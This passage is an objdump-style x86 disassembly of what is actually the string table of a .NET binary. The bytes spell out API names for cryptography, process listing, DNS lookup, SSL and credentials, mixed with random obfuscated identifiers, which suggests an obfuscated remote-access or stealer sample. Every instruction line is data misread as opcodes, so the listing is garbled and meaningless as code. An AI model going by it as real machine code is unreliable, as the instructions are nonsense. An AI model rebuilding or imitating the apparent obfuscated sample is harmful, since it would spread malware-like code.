  409495:	67 4d                	addr16 dec %ebp
  409497:	68 56 71 00 55       	push   $0x55007156
  40949c:	52                   	push   %edx
  40949d:	57                   	push   %edi
  40949e:	4b                   	dec    %ebx
  40949f:	72 69                	jb     0x40950a
  4094a1:	74 66                	je     0x409509
  4094a3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4094a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4094a6:	55                   	push   %ebp
  4094a7:	66 71 00             	data16 jno 0x4094aa
  4094aa:	53                   	push   %ebx
  4094ab:	79 73                	jns    0x409520
  4094ad:	74 65                	je     0x409514
  4094af:	6d                   	insl   (%dx),%es:(%edi)
  4094b0:	2e 4c                	cs dec %esp
  4094b2:	69 6e 71 00 72 58 50 	imul   $0x50587200,0x71(%esi),%ebp
  4094b9:	48                   	dec    %eax
  4094ba:	50                   	push   %eax
  4094bb:	58                   	pop    %eax
  4094bc:	4f                   	dec    %edi
  4094bd:	50                   	push   %eax
  4094be:	67 77 71             	addr16 ja 0x409532
  4094c1:	00 6d 5a             	add    %ch,0x5a(%ebp)
  4094c4:	5a                   	pop    %edx
  4094c5:	79 42                	jns    0x409509
  4094c7:	64 43                	fs inc %ebx
  4094c9:	6c                   	insb   (%dx),%es:(%edi)
  4094ca:	78 73                	js     0x40953f
  4094cc:	4c                   	dec    %esp
  4094cd:	41                   	inc    %ecx
  4094ce:	72 00                	jb     0x4094d0
  4094d0:	72 71                	jb     0x409543
  4094d2:	4b                   	dec    %ebx
  4094d3:	6c                   	insb   (%dx),%es:(%edi)
  4094d4:	4f                   	dec    %edi
  4094d5:	43                   	inc    %ebx
  4094d6:	63 71 76             	arpl   %esi,0x76(%ecx)
  4094d9:	70 55                	jo     0x409530
  4094db:	44                   	inc    %esp
  4094dc:	72 00                	jb     0x4094de
  4094de:	6c                   	insb   (%dx),%es:(%edi)
  4094df:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e0:	62 4a 58             	bound  %ecx,0x58(%edx)
  4094e3:	76 64                	jbe    0x409549
  4094e5:	58                   	pop    %eax
  4094e6:	67 46                	addr16 inc %esi
  4094e8:	72 00                	jb     0x4094ea
  4094ea:	79 6e                	jns    0x40955a
  4094ec:	7a 70                	jp     0x40955e
  4094ee:	52                   	push   %edx
  4094ef:	64 4f                	fs dec %edi
  4094f1:	5a                   	pop    %edx
  4094f2:	52                   	push   %edx
  4094f3:	47                   	inc    %edi
  4094f4:	78 55                	js     0x40954b
  4094f6:	47                   	inc    %edi
  4094f7:	72 00                	jb     0x4094f9
  4094f9:	7a 70                	jp     0x40956b
  4094fb:	41                   	inc    %ecx
  4094fc:	47                   	inc    %edi
  4094fd:	68 43 71 5a 68       	push   $0x685a7143
  409502:	41                   	inc    %ecx
  409503:	5a                   	pop    %edx
  409504:	69 59 72 00 43 6c 65 	imul   $0x656c4300,0x72(%ecx),%ebx
  40950b:	61                   	popa
  40950c:	72 00                	jb     0x40950e
  40950e:	43                   	inc    %ebx
  40950f:	68 61 72 00 49       	push   $0x49007261
  409514:	6e                   	outsb  %ds:(%esi),(%dx)
  409515:	76 6f                	jbe    0x409586
  409517:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  40951b:	6d                   	insl   (%dx),%es:(%edi)
  40951c:	62 65 72             	bound  %esp,0x72(%ebp)
  40951f:	00 4d 44             	add    %cl,0x44(%ebp)
  409522:	35 43 72 79 70       	xor    $0x70797243,%eax
  409527:	74 6f                	je     0x409598
  409529:	53                   	push   %ebx
  40952a:	65 72 76             	gs jb  0x4095a3
  40952d:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  409534:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  40953b:	41 
  40953c:	43                   	inc    %ebx
  40953d:	72 79                	jb     0x4095b8
  40953f:	70 74                	jo     0x4095b5
  409541:	6f                   	outsl  %ds:(%esi),(%dx)
  409542:	53                   	push   %ebx
  409543:	65 72 76             	gs jb  0x4095bc
  409546:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40954d:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  409554:	73 
  409555:	43                   	inc    %ebx
  409556:	72 79                	jb     0x4095d1
  409558:	70 74                	jo     0x4095ce
  40955a:	6f                   	outsl  %ds:(%esi),(%dx)
  40955b:	53                   	push   %ebx
  40955c:	65 72 76             	gs jb  0x4095d5
  40955f:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  409566:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  40956d:	72 
  40956e:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  409575:	64 65 72 00          	fs gs jb 0x409579
  409579:	4d                   	dec    %ebp
  40957a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409581:	74 2e                	je     0x4095b1
  409583:	43                   	inc    %ebx
  409584:	53                   	push   %ebx
  409585:	68 61 72 70 2e       	push   $0x2e707261
  40958a:	52                   	push   %edx
  40958b:	75 6e                	jne    0x4095fb
  40958d:	74 69                	je     0x4095f8
  40958f:	6d                   	insl   (%dx),%es:(%edi)
  409590:	65 42                	gs inc %edx
  409592:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  409599:	61                   	popa
  40959a:	6c                   	insb   (%dx),%es:(%edi)
  40959b:	6c                   	insb   (%dx),%es:(%edi)
  40959c:	53                   	push   %ebx
  40959d:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  4095a4:	65 
  4095a5:	72 00                	jb     0x4095a7
  4095a7:	67 65 74 5f          	addr16 gs je 0x40960a
  4095ab:	42                   	inc    %edx
  4095ac:	75 66                	jne    0x409614
  4095ae:	66 65 72 00          	data16 gs jb 0x4095b2
  4095b2:	73 65                	jae    0x409619
  4095b4:	74 5f                	je     0x409615
  4095b6:	42                   	inc    %edx
  4095b7:	75 66                	jne    0x40961f
  4095b9:	66 65 72 00          	data16 gs jb 0x4095bd
  4095bd:	67 65 74 5f          	addr16 gs je 0x409620
  4095c1:	41                   	inc    %ecx
  4095c2:	73 49                	jae    0x40960d
  4095c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4095c5:	74 65                	je     0x40962c
  4095c7:	67 65 72 00          	addr16 gs jb 0x4095cb
  4095cb:	73 65                	jae    0x409632
  4095cd:	74 5f                	je     0x40962e
  4095cf:	41                   	inc    %ecx
  4095d0:	73 49                	jae    0x40961b
  4095d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4095d3:	74 65                	je     0x40963a
  4095d5:	67 65 72 00          	addr16 gs jb 0x4095d9
  4095d9:	4d                   	dec    %ebp
  4095da:	61                   	popa
  4095db:	6e                   	outsb  %ds:(%esi),(%dx)
  4095dc:	61                   	popa
  4095dd:	67 65 6d             	gs insl (%dx),%es:(%di)
  4095e0:	65 6e                	outsb  %gs:(%esi),(%dx)
  4095e2:	74 4f                	je     0x409633
  4095e4:	62 6a 65             	bound  %ebp,0x65(%edx)
  4095e7:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  4095eb:	61                   	popa
  4095ec:	72 63                	jb     0x409651
  4095ee:	68 65 72 00 53       	push   $0x53007265
  4095f3:	65 73 73             	gs jae 0x409669
  4095f6:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4095fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4095fe:	67 45                	addr16 inc %ebp
  409600:	76 65                	jbe    0x409667
  409602:	6e                   	outsb  %ds:(%esi),(%dx)
  409603:	74 48                	je     0x40964d
  409605:	61                   	popa
  409606:	6e                   	outsb  %ds:(%esi),(%dx)
  409607:	64 6c                	fs insb (%dx),%es:(%edi)
  409609:	65 72 00             	gs jb  0x40960c
  40960c:	54                   	push   %esp
  40960d:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  409614:	55                   	push   %ebp
  409615:	70 70                	jo     0x409687
  409617:	65 72 00             	gs jb  0x40961a
  40961a:	43                   	inc    %ebx
  40961b:	75 72                	jne    0x40968f
  40961d:	72 65                	jb     0x409684
  40961f:	6e                   	outsb  %ds:(%esi),(%dx)
  409620:	74 55                	je     0x409677
  409622:	73 65                	jae    0x409689
  409624:	72 00                	jb     0x409626
  409626:	53                   	push   %ebx
  409627:	74 72                	je     0x40969b
  409629:	65 61                	gs popa
  40962b:	6d                   	insl   (%dx),%es:(%edi)
  40962c:	57                   	push   %edi
  40962d:	72 69                	jb     0x409698
  40962f:	74 65                	je     0x409696
  409631:	72 00                	jb     0x409633
  409633:	54                   	push   %esp
  409634:	65 78 74             	gs js  0x4096ab
  409637:	57                   	push   %edi
  409638:	72 69                	jb     0x4096a3
  40963a:	74 65                	je     0x4096a1
  40963c:	72 00                	jb     0x40963e
  40963e:	45                   	inc    %ebp
  40963f:	6e                   	outsb  %ds:(%esi),(%dx)
  409640:	74 65                	je     0x4096a7
  409642:	72 00                	jb     0x409644
  409644:	42                   	inc    %edx
  409645:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  40964c:	72 
  40964d:	74 65                	je     0x4096b4
  40964f:	72 00                	jb     0x409651
  409651:	54                   	push   %esp
  409652:	6f                   	outsl  %ds:(%esi),(%dx)
  409653:	4c                   	dec    %esp
  409654:	6f                   	outsl  %ds:(%esi),(%dx)
  409655:	77 65                	ja     0x4096bc
  409657:	72 00                	jb     0x409659
  409659:	49                   	dec    %ecx
  40965a:	45                   	inc    %ebp
  40965b:	6e                   	outsb  %ds:(%esi),(%dx)
  40965c:	75 6d                	jne    0x4096cb
  40965e:	65 72 61             	gs jb  0x4096c2
  409661:	74 6f                	je     0x4096d2
  409663:	72 00                	jb     0x409665
  409665:	4d                   	dec    %ebp
  409666:	61                   	popa
  409667:	6e                   	outsb  %ds:(%esi),(%dx)
  409668:	61                   	popa
  409669:	67 65 6d             	gs insl (%dx),%es:(%di)
  40966c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40966e:	74 4f                	je     0x4096bf
  409670:	62 6a 65             	bound  %ebp,0x65(%edx)
  409673:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  409677:	75 6d                	jne    0x4096e6
  409679:	65 72 61             	gs jb  0x4096dd
  40967c:	74 6f                	je     0x4096ed
  40967e:	72 00                	jb     0x409680
  409680:	53                   	push   %ebx
  409681:	79 73                	jns    0x4096f6
  409683:	74 65                	je     0x4096ea
  409685:	6d                   	insl   (%dx),%es:(%edi)
  409686:	2e 43                	cs inc %ebx
  409688:	6f                   	outsl  %ds:(%esi),(%dx)
  409689:	6c                   	insb   (%dx),%es:(%edi)
  40968a:	6c                   	insb   (%dx),%es:(%edi)
  40968b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409690:	6e                   	outsb  %ds:(%esi),(%dx)
  409691:	73 2e                	jae    0x4096c1
  409693:	49                   	dec    %ecx
  409694:	45                   	inc    %ebp
  409695:	6e                   	outsb  %ds:(%esi),(%dx)
  409696:	75 6d                	jne    0x409705
  409698:	65 72 61             	gs jb  0x4096fc
  40969b:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  40969f:	47                   	inc    %edi
  4096a0:	65 74 45             	gs je  0x4096e8
  4096a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4096a4:	75 6d                	jne    0x409713
  4096a6:	65 72 61             	gs jb  0x40970a
  4096a9:	74 6f                	je     0x40971a
  4096ab:	72 00                	jb     0x4096ad
  4096ad:	41                   	inc    %ecx
  4096ae:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4096b2:	61                   	popa
  4096b3:	74 6f                	je     0x409724
  4096b5:	72 00                	jb     0x4096b7
  4096b7:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  4096bc:	00 2e                	add    %ch,(%esi)
  4096be:	63 63 74             	arpl   %esp,0x74(%ebx)
  4096c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4096c2:	72 00                	jb     0x4096c4
  4096c4:	4d                   	dec    %ebp
  4096c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4096c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4096c7:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  4096ce:	65 
  4096cf:	61                   	popa
  4096d0:	74 65                	je     0x409737
  4096d2:	44                   	inc    %esp
  4096d3:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  4096d7:	70 74                	jo     0x40974d
  4096d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4096da:	72 00                	jb     0x4096dc
  4096dc:	43                   	inc    %ebx
  4096dd:	72 65                	jb     0x409744
  4096df:	61                   	popa
  4096e0:	74 65                	je     0x409747
  4096e2:	45                   	inc    %ebp
  4096e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4096e4:	63 72 79             	arpl   %esi,0x79(%edx)
  4096e7:	70 74                	jo     0x40975d
  4096e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4096ea:	72 00                	jb     0x4096ec
  4096ec:	49                   	dec    %ecx
  4096ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4096ee:	74 50                	je     0x409740
  4096f0:	74 72                	je     0x409764
  4096f2:	00 43 72             	add    %al,0x72(%ebx)
  4096f5:	4c                   	dec    %esp
  4096f6:	6d                   	insl   (%dx),%es:(%edi)
  4096f7:	59                   	pop    %ecx
  4096f8:	78 59                	js     0x409753
  4096fa:	53                   	push   %ebx
  4096fb:	42                   	inc    %edx
  4096fc:	53                   	push   %ebx
  4096fd:	73 00                	jae    0x4096ff
  4096ff:	50                   	push   %eax
  409700:	41                   	inc    %ecx
  409701:	6a 69                	push   $0x69
  409703:	77 63                	ja     0x409768
  409705:	6c                   	insb   (%dx),%es:(%edi)
  409706:	43                   	inc    %ebx
  409707:	59                   	pop    %ecx
  409708:	4f                   	dec    %edi
  409709:	57                   	push   %edi
  40970a:	56                   	push   %esi
  40970b:	73 00                	jae    0x40970d
  40970d:	53                   	push   %ebx
  40970e:	79 73                	jns    0x409783
  409710:	74 65                	je     0x409777
  409712:	6d                   	insl   (%dx),%es:(%edi)
  409713:	2e 44                	cs inc %esp
  409715:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40971c:	69 63 73 00 4d 69 63 	imul   $0x63694d00,0x73(%ebx),%esp
  409723:	72 6f                	jb     0x409794
  409725:	73 6f                	jae    0x409796
  409727:	66 74 2e             	data16 je 0x409758
  40972a:	56                   	push   %esi
  40972b:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  409732:	73 69                	jae    0x40979d
  409734:	63 2e                	arpl   %ebp,(%esi)
  409736:	44                   	inc    %esp
  409737:	65 76 69             	gs jbe 0x4097a3
  40973a:	63 65 73             	arpl   %esp,0x73(%ebp)
  40973d:	00 53 79             	add    %dl,0x79(%ebx)
  409740:	73 74                	jae    0x4097b6
  409742:	65 6d                	gs insl (%dx),%es:(%edi)
  409744:	2e 52                	cs push %edx
  409746:	75 6e                	jne    0x4097b6
  409748:	74 69                	je     0x4097b3
  40974a:	6d                   	insl   (%dx),%es:(%edi)
  40974b:	65 2e 49             	gs cs dec %ecx
  40974e:	6e                   	outsb  %ds:(%esi),(%dx)
  40974f:	74 65                	je     0x4097b6
  409751:	72 6f                	jb     0x4097c2
  409753:	70 53                	jo     0x4097a8
  409755:	65 72 76             	gs jb  0x4097ce
  409758:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40975f:	73 74                	jae    0x4097d5
  409761:	65 6d                	gs insl (%dx),%es:(%edi)
  409763:	2e 52                	cs push %edx
  409765:	75 6e                	jne    0x4097d5
  409767:	74 69                	je     0x4097d2
  409769:	6d                   	insl   (%dx),%es:(%edi)
  40976a:	65 2e 43             	gs cs inc %ebx
  40976d:	6f                   	outsl  %ds:(%esi),(%dx)
  40976e:	6d                   	insl   (%dx),%es:(%edi)
  40976f:	70 69                	jo     0x4097da
  409771:	6c                   	insb   (%dx),%es:(%edi)
  409772:	65 72 53             	gs jb  0x4097c8
  409775:	65 72 76             	gs jb  0x4097ee
  409778:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  40977f:	62 75 67             	bound  %esi,0x67(%ebp)
  409782:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  409789:	65 
  40978a:	73 00                	jae    0x40978c
  40978c:	45                   	inc    %ebp
  40978d:	78 70                	js     0x4097ff
  40978f:	61                   	popa
  409790:	6e                   	outsb  %ds:(%esi),(%dx)
  409791:	64 45                	fs inc %ebp
  409793:	6e                   	outsb  %ds:(%esi),(%dx)
  409794:	76 69                	jbe    0x4097ff
  409796:	72 6f                	jb     0x409807
  409798:	6e                   	outsb  %ds:(%esi),(%dx)
  409799:	6d                   	insl   (%dx),%es:(%edi)
  40979a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40979c:	74 56                	je     0x4097f4
  40979e:	61                   	popa
  40979f:	72 69                	jb     0x40980a
  4097a1:	61                   	popa
  4097a2:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  4097a6:	00 47 65             	add    %al,0x65(%edi)
  4097a9:	74 50                	je     0x4097fb
  4097ab:	72 6f                	jb     0x40981c
  4097ad:	63 65 73             	arpl   %esp,0x73(%ebp)
  4097b0:	73 65                	jae    0x409817
  4097b2:	73 00                	jae    0x4097b4
  4097b4:	47                   	inc    %edi
  4097b5:	65 74 48             	gs je  0x409800
  4097b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4097b9:	73 74                	jae    0x40982f
  4097bb:	41                   	inc    %ecx
  4097bc:	64 64 72 65          	fs fs jb 0x409825
  4097c0:	73 73                	jae    0x409835
  4097c2:	65 73 00             	gs jae 0x4097c5
  4097c5:	53                   	push   %ebx
  4097c6:	79 73                	jns    0x40983b
  4097c8:	74 65                	je     0x40982f
  4097ca:	6d                   	insl   (%dx),%es:(%edi)
  4097cb:	2e 53                	cs push %ebx
  4097cd:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4097d1:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  4097d8:	70 
  4097d9:	74 6f                	je     0x40984a
  4097db:	67 72 61             	addr16 jb 0x40983f
  4097de:	70 68                	jo     0x409848
  4097e0:	79 2e                	jns    0x409810
  4097e2:	58                   	pop    %eax
  4097e3:	35 30 39 43 65       	xor    $0x65433930,%eax
  4097e8:	72 74                	jb     0x40985e
  4097ea:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4097f1:	73 00                	jae    0x4097f3
  4097f3:	52                   	push   %edx
  4097f4:	66 63 32             	arpl   %si,(%edx)
  4097f7:	38 39                	cmp    %bh,(%ecx)
  4097f9:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  4097fd:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  409804:	73 00                	jae    0x409806
  409806:	52                   	push   %edx
  409807:	65 61                	gs popa
  409809:	64 41                	fs inc %ecx
  40980b:	6c                   	insb   (%dx),%es:(%edi)
  40980c:	6c                   	insb   (%dx),%es:(%edi)
  40980d:	42                   	inc    %edx
  40980e:	79 74                	jns    0x409884
  409810:	65 73 00             	gs jae 0x409813
  409813:	47                   	inc    %edi
  409814:	65 74 42             	gs je  0x409859
  409817:	79 74                	jns    0x40988d
  409819:	65 73 00             	gs jae 0x40981c
  40981c:	43                   	inc    %ebx
  40981d:	53                   	push   %ebx
  40981e:	68 61 72 70 41       	push   $0x41707261
  409823:	72 67                	jb     0x40988c
  409825:	75 6d                	jne    0x409894
  409827:	65 6e                	outsb  %gs:(%esi),(%dx)
  409829:	74 49                	je     0x409874
  40982b:	6e                   	outsb  %ds:(%esi),(%dx)
  40982c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40982e:	46                   	inc    %esi
  40982f:	6c                   	insb   (%dx),%es:(%edi)
  409830:	61                   	popa
  409831:	67 73 00             	addr16 jae 0x409834
  409834:	43                   	inc    %ebx
  409835:	53                   	push   %ebx
  409836:	68 61 72 70 42       	push   $0x42707261
  40983b:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  409842:	61                   	popa
  409843:	67 73 00             	addr16 jae 0x409846
  409846:	53                   	push   %ebx
  409847:	74 72                	je     0x4098bb
  409849:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  409850:	73 73                	jae    0x4098c5
  409852:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  409859:	6e                   	outsb  %ds:(%esi),(%dx)
  40985a:	67 45                	addr16 inc %ebp
  40985c:	76 65                	jbe    0x4098c3
  40985e:	6e                   	outsb  %ds:(%esi),(%dx)
  40985f:	74 41                	je     0x4098a2
  409861:	72 67                	jb     0x4098ca
  409863:	73 00                	jae    0x409865
  409865:	49                   	dec    %ecx
  409866:	43                   	inc    %ebx
  409867:	72 65                	jb     0x4098ce
  409869:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40986c:	74 69                	je     0x4098d7
  40986e:	61                   	popa
  40986f:	6c                   	insb   (%dx),%es:(%edi)
  409870:	73 00                	jae    0x409872
  409872:	73 65                	jae    0x4098d9
  409874:	74 5f                	je     0x4098d5
  409876:	43                   	inc    %ebx
  409877:	72 65                	jb     0x4098de
  409879:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40987c:	74 69                	je     0x4098e7
  40987e:	61                   	popa
  40987f:	6c                   	insb   (%dx),%es:(%edi)
  409880:	73 00                	jae    0x409882
  409882:	45                   	inc    %ebp
  409883:	71 75                	jno    0x4098fa
  409885:	61                   	popa
  409886:	6c                   	insb   (%dx),%es:(%edi)
  409887:	73 00                	jae    0x409889
  409889:	53                   	push   %ebx
  40988a:	73 6c                	jae    0x4098f8
  40988c:	50                   	push   %eax
  40988d:	72 6f                	jb     0x4098fe
  40988f:	74 6f                	je     0x409900
  409891:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409894:	73 00                	jae    0x409896
  409896:	53                   	push   %ebx
  409897:	79 73                	jns    0x40990c
  409899:	74 65                	je     0x409900
  40989b:	6d                   	insl   (%dx),%es:(%edi)
  40989c:	2e 57                	cs push %edi
  40989e:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  4098a5:	46                   	inc    %esi
  4098a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4098a7:	72 6d                	jb     0x409916
  4098a9:	73 00                	jae    0x4098ab
  4098ab:	44                   	inc    %esp
  4098ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4098ad:	73 00                	jae    0x4098af
  4098af:	43                   	inc    %ebx
  4098b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4098b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4098b2:	74 61                	je     0x409915
  4098b4:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  4098bb:	74 65                	je     0x409922
  4098bd:	6d                   	insl   (%dx),%es:(%edi)
  4098be:	2e 43                	cs inc %ebx
  4098c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4098c1:	6c                   	insb   (%dx),%es:(%edi)
  4098c2:	6c                   	insb   (%dx),%es:(%edi)
  4098c3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4098c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4098c9:	73 00                	jae    0x4098cb
  4098cb:	53                   	push   %ebx
  4098cc:	74 72                	je     0x409940
  4098ce:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  4098d5:	74 4f                	je     0x409926
  4098d7:	70 74                	jo     0x40994d
  4098d9:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  4098e0:	74 49                	je     0x40992b
  4098e2:	6d                   	insl   (%dx),%es:(%edi)
  4098e3:	61                   	popa
  4098e4:	67 65 44             	addr16 gs inc %esp
  4098e7:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  4098eb:	65 72 73             	gs jb  0x409961
  4098ee:	00 52 75             	add    %dl,0x75(%edx)
  4098f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4098f2:	74 69                	je     0x40995d
  4098f4:	6d                   	insl   (%dx),%es:(%edi)
  4098f5:	65 48                	gs dec %eax
  4098f7:	65 6c                	gs insb (%dx),%es:(%edi)
  4098f9:	70 65                	jo     0x409960
  4098fb:	72 73                	jb     0x409970
  4098fd:	00 53 73             	add    %dl,0x73(%ebx)
  409900:	6c                   	insb   (%dx),%es:(%edi)
  409901:	50                   	push   %eax
  409902:	6f                   	outsl  %ds:(%esi),(%dx)
  409903:	6c                   	insb   (%dx),%es:(%edi)
  409904:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  40990b:	72 73                	jb     0x409980
  40990d:	00 46 69             	add    %al,0x69(%esi)
  409910:	6c                   	insb   (%dx),%es:(%edi)
  409911:	65 41                	gs inc %ecx
  409913:	63 63 65             	arpl   %esp,0x65(%ebx)
  409916:	73 73                	jae    0x40998b
  409918:	00 47 65             	add    %al,0x65(%edi)
  40991b:	74 43                	je     0x409960
  40991d:	75 72                	jne    0x409991
  40991f:	72 65                	jb     0x409986
  409921:	6e                   	outsb  %ds:(%esi),(%dx)
  409922:	74 50                	je     0x409974
  409924:	72 6f                	jb     0x409995
  409926:	63 65 73             	arpl   %esp,0x73(%ebp)
  409929:	73 00                	jae    0x40992b
  40992b:	49                   	dec    %ecx
  40992c:	50                   	push   %eax
  40992d:	41                   	inc    %ecx
  40992e:	64 64 72 65          	fs fs jb 0x409997
  409932:	73 73                	jae    0x4099a7
  409934:	00 53 79             	add    %dl,0x79(%ebx)
  409937:	73 74                	jae    0x4099ad
  409939:	65 6d                	gs insl (%dx),%es:(%edi)
  40993b:	2e 4e                	cs dec %esi
  40993d:	65 74 2e             	gs je  0x40996e
  409940:	53                   	push   %ebx
  409941:	6f                   	outsl  %ds:(%esi),(%dx)
  409942:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409945:	74 73                	je     0x4099ba
  409947:	00 73 65             	add    %dh,0x65(%ebx)
  40994a:	74 5f                	je     0x4099ab
  40994c:	41                   	inc    %ecx
  40994d:	72 67                	jb     0x4099b6
  40994f:	75 6d                	jne    0x4099be
  409951:	65 6e                	outsb  %gs:(%esi),(%dx)
  409953:	74 73                	je     0x4099c8
  409955:	00 53 79             	add    %dl,0x79(%ebx)
  409958:	73 74                	jae    0x4099ce
  40995a:	65 6d                	gs insl (%dx),%es:(%edi)
  40995c:	45                   	inc    %ebp
  40995d:	76 65                	jbe    0x4099c4
  40995f:	6e                   	outsb  %ds:(%esi),(%dx)
  409960:	74 73                	je     0x4099d5
  409962:	00 45 78             	add    %al,0x78(%ebp)
  409965:	69 73 74 73 00 71 54 	imul   $0x54710073,0x74(%ebx),%esi
  40996c:	5a                   	pop    %edx
  40996d:	78 65                	js     0x4099d4
  40996f:	65 69 79 4e 74 00 66 	imul   $0x6c660074,%gs:0x4e(%ecx),%edi
  409976:	6c 
  409977:	78 72                	js     0x4099eb
  409979:	55                   	push   %ebp
  40997a:	66 4a                	dec    %dx
  40997c:	6a 54                	push   $0x54
  40997e:	52                   	push   %edx
  40997f:	57                   	push   %edi
  409980:	74 00                	je     0x409982
  409982:	43                   	inc    %ebx
  409983:	6f                   	outsl  %ds:(%esi),(%dx)
  409984:	6e                   	outsb  %ds:(%esi),(%dx)
  409985:	63 61 74             	arpl   %esp,0x74(%ecx)
  409988:	00 49 6d             	add    %cl,0x6d(%ecx)
  40998b:	61                   	popa
  40998c:	67 65 46             	addr16 gs inc %esi
  40998f:	6f                   	outsl  %ds:(%esi),(%dx)
  409990:	72 6d                	jb     0x4099ff
  409992:	61                   	popa
  409993:	74 00                	je     0x409995
  409995:	67 65 74 5f          	addr16 gs je 0x4099f8
  409999:	41                   	inc    %ecx
  40999a:	73 46                	jae    0x4099e2
  40999c:	6c                   	insb   (%dx),%es:(%edi)
  40999d:	6f                   	outsl  %ds:(%esi),(%dx)
  40999e:	61                   	popa
  40999f:	74 00                	je     0x4099a1
  4099a1:	73 65                	jae    0x409a08
  4099a3:	74 5f                	je     0x409a04
  4099a5:	41                   	inc    %ecx
  4099a6:	73 46                	jae    0x4099ee
  4099a8:	6c                   	insb   (%dx),%es:(%edi)
  4099a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4099aa:	61                   	popa
  4099ab:	74 00                	je     0x4099ad
  4099ad:	4d                   	dec    %ebp
  4099ae:	61                   	popa
  4099af:	6e                   	outsb  %ds:(%esi),(%dx)
  4099b0:	61                   	popa
  4099b1:	67 65 6d             	gs insl (%dx),%es:(%di)
  4099b4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4099b6:	74 42                	je     0x4099fa
  4099b8:	61                   	popa
  4099b9:	73 65                	jae    0x409a20
  4099bb:	4f                   	dec    %edi
  4099bc:	62 6a 65             	bound  %ebp,0x65(%edx)
  4099bf:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  4099c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4099c4:	6c                   	insb   (%dx),%es:(%edi)
  4099c5:	6c                   	insb   (%dx),%es:(%edi)
